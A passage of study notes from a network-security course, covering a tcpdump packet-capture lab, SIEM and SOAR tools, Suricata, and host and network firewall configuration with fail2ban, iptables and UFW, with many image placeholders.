\<p\>\<a href=\"https://www.iana.org/domains/example\"\>More
information\...\</a\>\</p\>

\</div\>

\</body\>

\</html\>

Once that\'s done, use the **job ID** (that you\'ve noted down earlier)
to bring the process to foreground with the following command:

fg % \[job-id\]

Copied!

content_copy

To stop this process, hit **Ctrl+C**.

It should return a summary of the number of packets captured.

sudo tcpdump -i eth0 port 80 -w http.pcap

\^C10 packets captured

10 packets received by filter

0 packets dropped by kernel

A binary file containing the packets we just captured,
called http.pcap, will also have been created. Don\'t try to print the
contents of this file to the screen; since it\'s a binary file, it\'ll
display as a bunch of garbled text that you won\'t be able to read.

http.pcap

Somewhere in that file, there\'s information about the packets created
when you pulled down the html from example.com. We can read from this
file using tcpdump now, using this command:

tcpdump -r http.pcap -nv

Output:

reading from file http.pcap, link-type EN10MB (Ethernet)

10:33:00.317909 IP (tos 0x0, ttl 64, id 31614, offset 0, flags \[DF\],
proto TCP (6), length 60)

172.17.0.2.43280 \> 93.184.216.34.80: Flags \[S\], cksum 0xe21c
(incorrect -\> 0xb084), seq 989487956, win 65320, options \[mss
1420,sackOK,TS val 1202857771 ecr 0,nop,wscale 7\], length 0

10:33:00.325430 IP (tos 0x60, ttl 53, id 24192, offset 0, flags
\[none\], proto TCP (6), length 60)

93.184.216.34.80 \> 172.17.0.2.43280: Flags \[S.\], cksum 0xc4f9
(correct), seq 2553104025, ack 989487957, win 65535, options \[mss
1460,sackOK,TS val 315226344 ecr 1202857771,nop,wscale 9\], length 0

10:33:00.325444 IP (tos 0x0, ttl 64, id 31615, offset 0, flags \[DF\],
proto TCP (6), length 52)

172.17.0.2.43280 \> 93.184.216.34.80: Flags \[.\], cksum 0xe214
(incorrect -\> 0xf1c0), ack 1, win 511, options \[nop,nop,TS val
1202857779 ecr 315226344\], length 0

10:33:00.325500 IP (tos 0x0, ttl 64, id 31616, offset 0, flags \[DF\],
proto TCP (6), length 127)

172.17.0.2.43280 \> 93.184.216.34.80: Flags \[P.\], cksum 0xe25f
(incorrect -\> 0x4f95), seq 1:76, ack 1, win 511, options \[nop,nop,TS
val 1202857779 ecr 315226344\], length 75: HTTP, length: 75

GET / HTTP/1.1

Host: example.com

User-Agent: curl/7.64.0

Accept: \*/\*

10:33:00.332224 IP (tos 0x60, ttl 53, id 24193, offset 0, flags
\[none\], proto TCP (6), length 52)

93.184.216.34.80 \> 172.17.0.2.43280: Flags \[.\], cksum 0xf2ed
(correct), ack 76, win 128, options \[nop,nop,TS val 315226351 ecr
1202857779\], length 0

10:33:00.332588 IP (tos 0x60, ttl 53, id 24194, offset 0, flags
\[none\], proto TCP (6), length 1659)

93.184.216.34.80 \> 172.17.0.2.43280: Flags \[P.\], cksum 0xe85b
(incorrect -\> 0xa3b5), seq 1:1608, ack 76, win 128, options
\[nop,nop,TS val 315226351 ecr 1202857779\], length 1607: HTTP, length:
1607

HTTP/1.1 200 OK

Accept-Ranges: bytes

Age: 501852

Cache-Control: max-age=604800

Content-Type: text/html; charset=UTF-8

Note that we don\'t need to use sudo to read packets from a file. Also
note that tcpdump writes full packets to the file, not just the
text-based analysis that it prints to the screen when it\'s operating
normally. For example, somewhere in the output you should see the html
that was returned as the body of the original query in the terminal.

\<!doctype html\>

\<html\>

\<head\>

\<title\>Example Domain\</title\>

\<meta charset=\"utf-8\"/\>

\<meta http-equiv=\"Content-type\" content=\"text/html;
charset=utf-8\"/\>

\<meta name=\"viewport\" content=\"width=device-width,
initial-scale=1\"/\>

\<style type=\"text/css\"\>

body {

background-color: #f0f0f2;

margin: 0;

padding: 0;

font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\",
\"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;

}

div {

width: 600px;

margin: 5em auto;

padding: 2em;

background-color: #fdfdff;

border-radius: 0.5em;

box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);

}

a:link, a:visited {

color: #38488f;

text-decoration: none;

}

\@media (max-width: 700px) {

div {

margin: 0 auto;

width: auto;

}

}

\</style\>

\</head\>

\<body\>

\<div\>

\<h1\>Example Domain\</h1\>

\<p\>This domain is for use in illustrative examples in documents. You
may use this

domain in literature without prior coordination or asking for
permission.\</p\>

\<p\>\<a href=\"https://www.iana.org/domains/example\"\>More
information\...\</a\>\</p\>

\</div\>

\</body\>

\</html\>

Click Check my progress to verify the objective.

Writing packets to a file

Check my progress

#### Network Security

##### Network Security best practices

###### Security through obscurity

![Graphical user interface, text, application, email Description
automatically generated](media/image703.png){width="6.5in"
height="1.1152777777777778in"}

###### Network segmentation

[Network segmentation is **a technique that divides a computer network
into smaller parts, each acting as its own small network, to improve
network performance and security**. It is also known as network
segregation, network partitioning, or network isolation.t]{.mark}

###### Implicit deny (Whitelisting)

There\'s a general security principle that can be applied to most areas
of security, it\'s the concept of disabling unnecessary extra services
or restricting access to them. Since any service that\'s enabled and
accessible can be attacked, this principle should be applied to network
security too. Networks would be much safer if you disable access to
network services that aren\'t needed and enforce access restrictions.
Implicit deny is a network security concept where anything not
explicitly permitted or allowed should be denied. This is different from
blocking all traffic, since an implicit deny configuration will still
let traffic pass that you\'ve defined as allowed, you can do this
through ACL configurations. This can usually be configured on a firewall
which makes it easier to build secure firewall rules. Instead of
requiring you to specifically block all traffic you don\'t want, you can
just create rules for traffic that you need to go through. You can think
of this as whitelisting, as opposed to blacklisting. While this is
slightly less convenient, it\'s a much more secure configuration. Before
a new service will work, a new rule must be defined for it reducing
convenience a bit. If you want to learn more about how to configure a
firewall rules and Linux and other implementations, take a look at the
references in the supplementary reading.

##### Network Monitoring

Another very important component of network security is monitoring and
analyzing traffic on your network. There are a couple of reasons why
monitoring your network is so important. The first is that it lets you
establish a baseline of what your typical network traffic looks like.
This is key because in order to know what unusual or potential attack
traffic looks like, you need to know what normal traffic looks like. You
can do this through network traffic monitoring and logs analysis. We\'ll
dive deeper into what network traffic monitoring is a bit later, but
let\'s quickly summarize how laws can be helpful in this context.
Analyzing logs is the practice of collecting logs from different network
and sometimes client devices on your network, then performing an
automated analysis on them. This will highlight potential intrusions,
signs of malware infections or a typical behavior. You\'d want to
analyze things like firewall logs, authentication server logs, and
application logs. As an IT support specialist, you should pay close
attention to any external facing devices or services. They\'re subject
to a lot more potentially malicious traffic which increases the risk of
compromise. Analysis of logs would involve looking for specific log
messages of interests, like with firewall logs. Attempted connections to
an internal service from an untrusted source address may be worth
investigating. Connections from the internal network to known address
ranges of Botnet command and control servers could mean there\'s a
compromised machine on the network. As you learned in earlier courses of
this program, log and analysis systems are a best practice for IT
supports specialists to utilize and implement. This is true too for
network hardening. Logs analysis systems are configured using
user-defined rules to match interesting or a typical log entries. These
can then be surfaced through an alerting system to let security
engineers investigate the alert. Part of this alerting process would
also involve categorizing the alert, based on the rule matched. You\'d
also need to assign a priority to facilitate this investigation and to
permit better searching or filtering. Alerts could take the form of
sending an email or an SMS with information, and a link to the event
that was detected. You could even wake someone up in the middle of the
night if the event was severe enough. Normalizing logged data is an
important step, since logs from different devices and systems may not be
formatted in a common way. You might need to convert log components into
a common format to make analysis easier for analysts, and rule-based
detection systems, this also makes correlation analysis easier.
Correlation analysis is the process of taking log data from different
systems, and matching events across the systems. So, if we see a
suspicious connection coming from a suspect source address and the
firewall logs to our authentication server, we might want to correlate
that logged connection with the log data of the authentication server.
That would show us any authentication attempts made by the suspicious
client. This type of logs analysis is also super important in
investigating and recreating the events that happened once a compromise
is detected. This is usually called a post fail analysis, since it\'s
investigating how a compromise happened after the breach is detected.
Detailed logging and analysis of logs would allow for detailed
reconstruction of the events that led to the compromise. Hopefully, this
will let the security team make appropriate changes to security systems
to prevent further attacks. It could also help determine the extent and
severity of the compromise. Detailed logging would also be able to show
if further systems were compromised after the initial breach. It would
also tell us whether or not any data was stolen, and if it was, what
that data was. One popular and powerful logs analysis system is Splunk,
a very flexible and extensible log aggregation and search system. Splunk
can grab logs data from a wide variety of systems, and in large amounts
of formats. It can also be configured to generate alerts, and allows for
powerful visualization of activity based on logged data. You can read
more about Splunk and the supplementary readings in this lesson.

###### IP Scanning

There are many open-source databases out there, like AbuseIPDB, and
Cisco Talos Intelligence, where you can perform a reputation and
location check for the IP address. Most security analysts use these
tools to aid them with alert investigations. You can also make the
Internet safer by reporting the malicious IPs, for example, on
AbuseIPDB.

<https://www.abuseipdb.com/>

<https://www.talosintelligence.com/>

<https://scamalytics.com/>

<https://www.lookip.net/>

<https://www.ipqualityscore.com/free-ip-lookup-proxy-vpn-test>

<https://www.virustotal.com/gui/home/url>

###### SIEM (log aggregator/analyzer/metric-gatherer/dashboard creator)

A **SIEM tool** is an application that collects and analyzes log data to
monitor critical activities in an organization. A **log** is a record of
events that occur within an organization's systems. Depending on the
amount of data you're working with, it could take hours or days to
filter through log data on your own. SIEM tools reduce the amount of
data an analyst must review by providing alerts for specific types of
threats, risks, and vulnerabilities.

SIEM tools provide a series of dashboards that visually organize data
into categories, allowing users to select the data they wish to analyze.
Different SIEM tools have different dashboard types that display the
information you have access to. 

SIEM tools also come with different hosting options, including
on-premise and cloud. Organizations may choose one hosting option over
another based on a security team member's expertise. For example,
because a cloud-hosted version tends to be easier to set up, use, and
maintain than an on-premise version, a less experienced security team
may choose this option for their organization.

***Lecture***

A log is a record of events that occur within an organization\'s
systems. Examples of security-related logs include records of employees
signing into their computers or accessing web-based services. Logs help
security professionals identify vulnerabilities and potential security
breaches.

The first tools we\'ll discuss are security information and event
management tools, or SIEM tools. A SIEM tool is an application that
collects and analyzes log data to monitor critical activities in an
organization. The acronym S-I-E-M may be pronounced as \'sim\' or
\'seem\', but we\'ll use \'sim\' throughout this program. SIEM tools
collect real-time, or instant, information, and allow security analysts
to identify potential breaches as they happen.

Imagine having to read pages and pages of logs to determine if there are
any security threats. Depending on the amount of data, it could take
hours or days. SIEM tools reduce the amount of data an analyst must
review by providing alerts for specific types of risks and threats.
Next, let\'s go over examples of commonly used SIEM tools: Splunk and
Chronicle.

Splunk is a data analysis platform, and Splunk Enterprise provides SIEM
solutions. Splunk Enterprise is a self-hosted tool used to retain,
analyze, and search an organization\'s log data.

Another SIEM tool is Google\'s Chronicle. Chronicle is a cloud-native
SIEM tool that stores security data for search and analysis.
Cloud-native means that Chronicle allows for fast delivery of new
features.

Both of these SIEM tools, and SIEMs in general, collect data from
multiple places, then analyze and filter that data to allow security
teams to prevent and quickly react to potential security threats.

As a security analyst, you may find yourself using SIEM tools to analyze
filtered events and patterns, perform incident analysis, or proactively
search for threats. Depending on your organization\'s SIEM setup and
risk focus, the tools and how they function may differ, but ultimately,
they are all used to mitigate risk.

Other key tools that you will use in your role as a security analyst,
and that you\'ll have hands-on opportunities to use later in the
program, are playbooks and network protocol analyzers.

A playbook is a manual that provides details about any operational
action, such as how to respond to an incident. Playbooks, which vary
from one organization to the next, guide analysts in how to handle a
security incident before, during, and after it has occurred. Playbooks
can pertain to security or compliance reviews, access management, and
many other organizational tasks that require a documented process from
beginning to end.

Another tool you may use as a security analyst is a network protocol
analyzer, also called packet sniffer. A packet sniffer is a tool
designed to capture and analyze data traffic within a network. Common
network protocol analyzers include tcpdump and Wireshark.

As an entry-level analyst, you don\'t have to be an expert in these
tools. As you continue through this certificate program and get more
hands-on practice, you\'ll continuously build your understanding of how
to use these tools to identify, assess, and mitigate risks.

####### What SIEM tools analyze

**Logs commonly aggregated/analyzed:**

-   Firewall logs

-   Network logs

-   Server logs

As a security analyst, one of your responsibilities might include
analyzing log data to mitigate and manage threats, risks, and
vulnerabilities. As a reminder, a log is a record of events that occur
within an organization\'s systems and networks. Security analysts access
a variety of logs from different sources. Three common log sources
include firewall logs, network logs, and server logs. Let\'s explore
each of these log sources in more detail.

A firewall log is a record of attempted or established connections for
incoming traffic from the internet. It also includes outbound requests
to the internet from within the network.

A network log is a record of all computers and devices that enter and
leave the network. It also records connections between devices and
services on the network.

Finally, a server log is a record of events related to services such as
websites, emails, or file shares. It includes actions such as login,
password, and username requests.

By monitoring logs, like the one shown here, security teams can identify
vulnerabilities and potential data breaches. Understanding logs is
important because SIEM tools rely on logs to monitor systems and detect
security threats.

A security information and event management, or SIEM, tool is an
application that collects and analyzes log data to monitor critical
activities in an organization. It provides real-time visibility, event
monitoring and analysis, and automated alerts. It also stores all log
data in a centralized location.

Because SIEM tools index and minimize the number of logs a security
professional must manually review and analyze, they increase efficiency
and save time.

But, SIEM tools must be configured and customized to meet each
organization\'s unique security needs. As new threats and
vulnerabilities emerge, organizations must continually customize their
SIEM tools to ensure that threats are detected and quickly addressed.

Later in the certificate program, you\'ll have a chance to practice
using different SIEM tools to identify potential security incidents.

Coming up, we\'ll explore SIEM dashboards and how cybersecurity
professionals use them to monitor for threats, risks, and
vulnerabilities.

####### Common SIEM tools

**[Self-hosted vs Cloud hosted]{.underline}**

**Self-hosted** SIEM tools require organizations to install, operate,
and maintain the tool using their own physical infrastructure, such as
server capacity. These applications are then managed and maintained by
the organization\'s IT department, rather than a third party vendor.
Self-hosted SIEM tools are ideal when an organization is required to
maintain physical control over confidential data.

Alternatively**, cloud-hosted** SIEM tools are maintained and managed by
the SIEM providers, making them accessible through the internet.
Cloud-hosted SIEM tools are ideal for organizations that don\'t want to
invest in creating and maintaining their own infrastructure.

Or, an organization can choose to use a combination of both self-hosted
and cloud-hosted SIEM tools, known as a hybrid solution. Organizations
might choose a hybrid SIEM solution to leverage the benefits of the
cloud while also maintaining physical control over confidential data.

**[Common SIEM Tools]{.underline}**

**Splunk Enterprise, Splunk Cloud, and Chronicle** are common SIEM tools
that many organizations use to help protect their data and systems.
Let\'s begin by discussing Splunk.

######## Splunk

**Splunk** is a data analysis platform and Splunk Enterprise provides
SIEM solutions.

-   ***Splunk Enterprise*** is a self-hosted tool used to retain,
    analyze, and search an organization\'s log data to provide security
    information and alerts in real-time.

-   ***Splunk Cloud*** is a cloud-hosted tool used to collect, search,
    and monitor log data. Splunk Cloud is helpful for organizations
    running hybrid or cloud-only environments, where some or all of the
    organization\'s services are in the cloud.

######### Splunk Dashboards

Review the following Splunk dashboards and their purposes:

**Security posture dashboard**

The security posture dashboard is designed for security operations
centers (SOCs). It displays the last 24 hours of an organization's
notable security-related events and trends and allows security
professionals to determine if security infrastructure and policies are
performing as designed. Security analysts can use this dashboard to
monitor and investigate potential threats in real time, such as
suspicious network activity originating from a specific IP address.

**Executive summary dashboard**

The executive summary dashboard analyzes and monitors the overall health
of the organization over time. This helps security teams improve
security measures that reduce risk. Security analysts might use this
dashboard to provide high-level insights to stakeholders, such as
generating a summary of security incidents and trends over a specific
period of time.

**Incident review dashboard**

The incident review dashboard allows analysts to identify suspicious
patterns that can occur in the event of an incident. It assists by
highlighting higher risk items that need immediate review by an analyst.
This dashboard can be very helpful because it provides a visual timeline
of the events leading up to an incident.

**Risk analysis dashboard**

The risk analysis dashboard helps analysts identify risk for each risk
object (e.g., a specific user, a computer, or an IP address). It shows
changes in risk-related activity or behavior, such as a user logging in
outside of normal working hours or unusually high network traffic from a
specific computer. A security analyst might use this dashboard to
analyze the potential impact of vulnerabilities in critical assets,
which helps analysts prioritize their risk mitigation efforts.

######## Chronicle (Google)

Finally, there\'s Google\'s **Chronicle**.

**Chronicle** is a cloud-native tool designed to retain, analyze, and
search data. Chronicle provides log monitoring, data analysis, and data
collection. Like cloud-hosted tools, cloud-native tools are also fully
maintained and managed by the vendor. But cloud-native tools are
specifically designed to take full advantage of cloud computing
capabilities such as availability, flexibility, and scalability.

Chronicle allows you to collect and analyze log data according to:

-   A specific asset

-   A domain name

-   A user

-   An IP address

######### Chronicle Dashboards

**Enterprise insights dashboard**

The enterprise insights dashboard highlights recent alerts. It
identifies suspicious domain names in logs, known as indicators of
compromise (IOCs). Each result is labeled with a confidence score to
indicate the likelihood of a threat. It also provides a severity level
that indicates the significance of each threat to the organization. A
security analyst might use this dashboard to monitor login or data
access attempts related to a critical asset---like an application or
system---from unusual locations or devices.

**Data ingestion and health dashboard**

The data ingestion and health dashboard shows the number of event logs,
log sources, and success rates of data being processed into Chronicle. A
security analyst might use this dashboard to ensure that log sources are
correctly configured and that logs are received without error. This
helps ensure that log related issues are addressed so that the security
team has access to the log data they need.

**IOC matches dashboard**

The IOC matches dashboard indicates the top threats, risks, and
vulnerabilities to the organization. Security professionals use this
dashboard to observe domain names, IP addresses, and device IOCs over
time in order to identify trends. This information is then used to
direct the security team's focus to the highest priority threats. For
example, security analysts can use this dashboard to search for
additional activity associated with an alert, such as a suspicious user
login from an unusual geographic location.

**Main dashboard**

The main dashboard displays a high-level summary of information related
to the organization's data ingestion, alerting, and event activity over
time. Security professionals can use this dashboard to access a timeline
of security events---such as a spike in failed login attempts--- to
identify threat trends across log sources, devices, IP addresses, and
physical locations.

**Rule detections dashboard**

The rule detections dashboard provides statistics related to incidents
with the highest occurrences, severities, and detections over time.
Security analysts can use this dashboard to access a list of all the
alerts triggered by a specific detection rule, such as a rule designed
to alert whenever a user opens a known malicious attachment from an
email. Analysts then use those statistics to help manage recurring
incidents and establish mitigation tactics to reduce an organization\'s
level of risk.

**User sign in overview dashboard**

The user sign in overview dashboard provides information about user
access behavior across the organization. Security analysts can use this
dashboard to access a list of all user sign-in events to identify
unusual user activity, such as a user signing in from multiple locations
at the same time. This information is then used to help mitigate
threats, risks, and vulnerabilities to user accounts and the
organization's applications.

###### SOAR

A security orchestration, automation, and response (SOAR) is used to
facilitate incident response, threat hunting, and security configuration
by orchestrating automated runbooks and delivering data enrichment. A
SOAR may be implemented as a standalone technology or integrated within
a SIEM as a next-gen SIEM. A *Security Information and Event Management*
(SIEM) system gathers security-related information and events from
various sources and presents them via one system. A SOAR can scan the
organization\'s store of security and threat intelligence, analyze it
using machine/deep learning techniques, and then use that data to
automate and provide data enrichment for the workflows that drive
incident response and threat hunting

**[SIEM tools and SOAR]{.underline}**

**Security orchestration, automation, and response (SOAR)** is a
collection of applications, tools, and workflows that uses automation to
respond to security events. Essentially, this means that handling common
security-related incidents with the use of SIEM tools is expected to
become a more streamlined process requiring less manual intervention.
This frees up security analysts to handle more complex and uncommon
incidents that, consequently, can't be automated with a SOAR.
Nevertheless, the expectation is for cybersecurity-related platforms to
communicate and interact with one another. Although the technology
allowing interconnected systems and devices to communicate with each
other exists, it is still a work in progress.

###### Suricata (IDS/SIEM)

Suricata is an open-source network analysis and threat detection
software.  Network analysis and threat detection software is used to
inspect network traffic to identify suspicious behavior and generate
network data logs. The detection software finds activity across users,
computers, or Internet Protocol (IP) addresses to help uncover potential
threats, risks, or vulnerabilities. 

Suricata was developed by the Open Information Security Foundation
(OISF). OISF is dedicated to maintaining open-source use of the Suricata
project to ensure it's free and publicly available. Suricata is widely
used in the public and private sector, and it integrates with many SIEM
tools and other security tools.

##### Firewalls

Most firewalls are similar in their basic functions. Firewalls allow or
block traffic based on a set of rules. As data packets enter a network,
the packet header is inspected and allowed or denied based on its port
number. NGFWs are also able to inspect packet payloads. Each system
should have its own firewall, regardless of the network firewall.

![A firewall circled by dashes, protecting the internal network from
internet traffic that comes in through the
mode.](media/image704.png){width="6.5in" height="1.2777777777777777in"}

###### Flood guards

Flood guards provide protection against Dos or denial of service
attacks. Think back to the CIA triad we covered earlier, availability is
an important tenet of security and is exactly what Flood guard
protections are designed to help ensure. This works by identifying
common flood attack types like SYN floods or UDP floods. It then
triggers alerts once a configurable threshold of traffic is reached.
There\'s another threshold called the activation threshold. When this
one is reached, it triggers a pre-configured action. This will typically
block the identified attack traffic for a specific amount of time. This
is usually a feature on enterprise grade routers or firewalls, though
it\'s a general security concept. A common open source flood guard
protection tool is **Fail2ban**. It watches for signs of an attack on a
system, and blocks further attempts from a suspected attack address.
Fail to ban is a popular tool for smaller scale organizations. So, if
you\'re the sole IT support specialist in your company or have a small
fleet of machines, this can be a helpful tool to use. This flood guard
protection can also be described as a form of intrusion prevention
system, which we\'ll cover in more detail in another video. Network
separation or network segmentation is a good security principle for an
IT support specialists to implement. It permits more flexible management
of the network, and provides some security benefits. This is the concept
of using VLANs to create virtual networks for different device classes
or types. Think of it as creating dedicated virtual networks for your
employees to use, but also having separate networks for your printers to
connect to. The idea here is that the printers won\'t need access to the
same network resources that employees do. It probably doesn\'t make
sense to have the printers on the employee network. You might be
wondering how employees are supposed to print if the printers are on a
different network. It\'s actually one of the benefits of network
separation, since we can control and monitor the flow of traffic between
networks more easily. To give employees access to printers, we\'d
configure routing between the two networks on our routers. We\'d also
implement network ACLs that permit the appropriate traffic

![Text Description automatically
generated](media/image705.png){width="6.5in"
height="3.634027777777778in"}

####### Fail2ban (scan log files)

![](media/image706.png){width="3.8474201662292216in"
height="0.3194608486439195in"}

**Config file**: /etc/fail2ban/jail.conf

**Enabled and start faile2ban service**

sudo systemctl enable fail2ban.service

sudo systemctl start fail2ban.service

![Text Description automatically
generated](media/image707.png){width="6.5in"
height="2.7958333333333334in"}

**Get failban status** *(need to be root/sudo)*

![Text Description automatically
generated](media/image708.png){width="6.5in"
height="1.0104166666666667in"}

**Get failban status on specific service**

![Text Description automatically
generated](media/image708.png){width="6.5in"
height="2.421527777777778in"}

**Unban an ip**

![](media/image709.png){width="6.5in" height="0.475in"}

***Overview***

![Text Description automatically
generated](media/image710.png){width="4.852777777777778in"
height="6.627906824146982in"}

![Graphical user interface, text Description automatically
generated](media/image711.png){width="4.882194881889764in"
height="5.46555883639545in"}

*Also good idea to utlizlise fail2ban logging service as well as
firewalls.*

![Text Description automatically
generated](media/image712.png){width="6.5in" height="1.4125in"}

**Configuration files**

![Text Description automatically generated with medium
confidence](media/image713.png){width="6.5in"
height="2.7583333333333333in"}

![](media/image714.png){width="6.5in" height="0.7673611111111112in"}

You can copy /etc/fail2ban/jail.conf to /etc/fail2ban/jail.local and
make changes to that file instead.

###### denyhosts

![Graphical user interface, website Description automatically
generated](media/image715.png){width="6.5in"
height="1.042361111111111in"}

Configuration file: ![](media/image716.png){width="5.444724409448819in"
height="0.35418525809273843in"}

\^ this is a ban list. Any Ips added will be banned.

Adding a denied ip:

![Text Description automatically
generated](media/image717.png){width="6.5in"
height="1.1979166666666667in"}

###### Edge/Network based Firewall

Our **network based** firewall has a duty to protect our internal
network by filtering traffic in and out of it, while the **host based**
firewall on each individual host protects that one machine. Like our
network based firewall, we\'d still want to start with an implicit deny
rule. Then, we\'d selectively enable specific services and ports that
will be used. This let us start with a secured default and then only
permits traffic that we know and trust. You can think of this as
starting with a perfectly secure firewall configuration and then poking
holes in it for the specific traffic we require. This may look very
different from your network firewall configuration since it\'s unlikely
that your employees would need remote SSH access to their laptops, for
example. Remember that to secure systems you need to minimize attack
surfaces or exposure. A host-based firewall plays a big part in reducing
what\'s accessible to an outside attacker. It provides flexibility while
only permitting connections to selective services on a given host from
specific networks or IP ranges. This ability to restrict connections
from certain origins is usually used to implement a highly secure host
to network. From there, access to critical or sensitive systems or
infrastructure is permitted. These are called Bastion hosts or networks,
and are specifically hardened and minimized to reduce what\'s permitted
to run on them. Bastion hosts are usually exposed to the internet so you
should pay special attention to hardening and locking them down to
reduce the chances of compromise. But they can also be used as a sort of
gateway or access portal into more sensitive services like core
authentication servers or domain controllers. This would let you
implement more secure authentication mechanisms and ACLs on the Bastion
hosts without making it inconvenient for your entire company. Monitoring
and logging can be prioritized for these hosts more easily. Typically,
these hosts or networks would also have severely limited network
connectivity. It\'s usually just to the secure zone that they\'re
designed to protect and not much else. Applications that are allowed to
be installed and run on these hosts would also be restricted to those
that are strictly necessary, since these machines have one specific
purpose. Part of the host base firewall rules will likely also provide
ACLs that allow access from the VPN subnet. It\'s good practice to keep
the network that VPN clients connected to separate using both subnetting
and VLANs. This gives you more flexibility to enforce security on these
VPN clients. It also lets you build additional layers of defenses, while
a VPN host should be protected using other means, it\'s still a host
that\'s operating in a potentially malicious environment. This host is
then initiating a remote connection into your trusted internal network.
These hosts represent another potential vector of attack and compromise.
Your ability to separately monitor traffic coming and going from them is
super useful. There\'s an important thing for you to consider when it
comes to host based firewalls, especially for client systems like
laptops. If the users of the system have administrator rights, then they
have the ability to change firewall rules and configurations. This is
something you should keep in mind and make sure to monitor with logging.
If management tools allow it, you should also prevent the disabling of
the host-based firewall. This can be done with Microsoft Windows
machines when administered using active directory as an example.

###### Software/Host-Based Firewall

Like we mentioned before, firewalls are critical to securing a network.
They can be deployed as dedicated network infrastructure devices, which
regulate the flow of traffic for a whole network. They can also be
host-based as software that runs on a client system providing protection
for that one host only. It\'s generally recommended to deploy both
solutions. A host-based firewall provides protection for mobile devices
such as a laptop that could be used in an untrusted, potentially
malicious environment like an airport Wi-Fi hotspot. Host-based
firewalls are also useful for protecting other hosts from being
compromised, by corrupt device on the internal network. That\'s
something a network-based firewall may not be able to help defend
against. You will almost definitely encounter host-based firewalls since
all major operating systems have built in ones today. It\'s also very
likely that your company will have some kind of network-based firewall.
Your router at home even has a network-based firewall built in.

Host-based firewalls are important to creating multiple layers of
security. They protect individual hosts from being compromised when
they\'re used in untrusted and potentially malicious environments. They
also protect individual hosts from potentially compromised peers inside
a trusted network.

[While a network-based firewall could protect against DDoS attacks
(using flood guards), host-based firewalls do not]{.underline}.

Host-Based firewalls also check the processes being requested for a
request.

![Text Description automatically
generated](media/image718.png){width="6.5in"
height="2.592361111111111in"}

####### Linux Host-based Firewalls 

A **firewall zone** defines a set of rules for each group of interfaces.

######## iptables (firewall as a service)

Uses netfilter behind the scenes. Firewall ***chains*** are groups of
rules which collectively compose firewall ***tables*** such that each
table has a set of chains which in turn contain a set of rules.

The iptables tool enables you to ***manage packet filtering*** as well
as ***stateful firewall** functionality* within Linux through various
tables. Each table applies to a certain context and consists of rule
sets, called chains, that the table uses to implement the firewall. 

Most of the work is done one one table named the **FILTER** table.

![Graphical user interface, text, application Description automatically
generated](media/image719.png){width="4.909027777777778in"
height="9.0in"}

\^ 'I' "insert" can be replaced with 'A' for "append" -- this is
important a first matching rules are applied and nothing else below
overrides a match against a packet.

**Block by tcp and port**

iptables -A INPUT -s 192.168.34.23 -p tcp --destination-port 22 -j DROP

![Text Description automatically
generated](media/image720.png){width="4.93080927384077in"
height="8.046925853018372in"}

![Text Description automatically
generated](media/image721.png){width="5.021091426071741in"
height="3.521013779527559in"}

![Text Description automatically
generated](media/image722.png){width="4.978472222222222in"
height="9.0in"}

![Text Description automatically
generated](media/image723.png){width="4.951643700787401in"
height="8.681001749781277in"}

![Text Description automatically
generated](media/image724.png){width="4.823611111111111in"
height="9.0in"}

![Text Description automatically generated with medium
confidence](media/image725.png){width="4.136022528433946in"
height="6.544272747156605in"}

**[Overview/Usage]{.underline}**

![Graphical user interface, text, application Description automatically
generated](media/image726.png){width="6.14669072615923in"
height="6.271708223972004in"}

![Text Description automatically generated with medium
confidence](media/image727.png){width="5.823729221347332in"
height="7.313520341207349in"}

![Text Description automatically
generated](media/image728.png){width="5.6674573490813644in"
height="2.073206474190726in"}

######## ipset

Allows you to groups sets of specific IP addresses.

######## nftables (newer version of ip tables -- aimed to replace iptables) "Netfilter"

Uses the **nft** command. ** **

There exists an translator called **iptables-translate**.

![](media/image729.png){width="5.646621828521435in"
height="0.5938331146106737in"}

![Text Description automatically
generated](media/image730.png){width="5.594530839895013in"
height="0.635505249343832in"}

######## UFW (Uncomplicated Firewall)

A tool used to simpifly firewall configuration and provide simpler ip
tables.

UFW is just a frontend for iptables to make it easier to manage. If you
create your rules with ufw, you\'ll see them when you run

iptables -L -n -v

iptables gives you more flexibility, but it\'s also slightly more
complicated to configure - so use whichever one you\'re most happy with.
If you use iptables, remember that it only affects IPv4 - you need to
also use ip6tables if your server has IPv6.

2-step process to allow connections:

**Open up port on active session:**

![](media/image731.png){width="6.5in" height="0.5409722222222222in"}

![](media/image732.png){width="6.5in" height="0.5923611111111111in"}

**Keep port open on bootup:**

![](media/image733.png){width="6.5in" height="0.4465277777777778in"}

<https://linuxconfig.org/how-to-install-and-use-ufw-firewall-on-linux>

<https://linuxhint.com/ufw-firewall-allow-ssh/>

**Verbose status output**

![Text Description automatically
generated](media/image734.png){width="4.890025153105862in"
height="2.9753641732283467in"}

**Allow/deny by ip**

![Text Description automatically
generated](media/image735.png){width="6.527217847769029in"
height="2.3032130358705163in"}

![Text Description automatically
generated](media/image736.png){width="6.5in"
height="2.5006944444444446in"}

######### Overview

![Graphical user interface, text, application, email Description
automatically generated](media/image737.png){width="6.011255468066492in"
height="3.9901399825021873in"}

######### Cheat Sheet

*Taken from*:
<https://www.digitalocean.com/community/tutorials/ufw-essentials-common-firewall-rules-and-commands>

![Graphical user interface, application Description automatically
generated](media/image738.png){width="6.5in"
height="6.045138888888889in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image739.png){width="6.5in"
height="6.0465277777777775in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image740.png){width="6.5in"
height="4.341666666666667in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image741.png){width="6.5in"
height="6.988194444444445in"}

![](media/image742.png){width="6.5in" height="0.48819444444444443in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image743.png){width="6.5in"
height="6.392361111111111in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image744.png){width="6.5in"
height="6.269444444444445in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image745.png){width="6.5in"
height="6.817361111111111in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image746.png){width="6.5in"
height="8.036805555555556in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image747.png){width="6.5in"
height="6.430555555555555in"}

\^ above says "access to any port from port 22"

![Graphical user interface, application, Teams Description automatically
generated](media/image748.png){width="6.5in"
height="7.528472222222222in"}

![Background pattern Description automatically
generated](media/image749.png){width="6.5in"
height="1.6819444444444445in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image750.png){width="6.5in"
height="4.942361111111111in"}

![Graphical user interface, application, Teams Description automatically
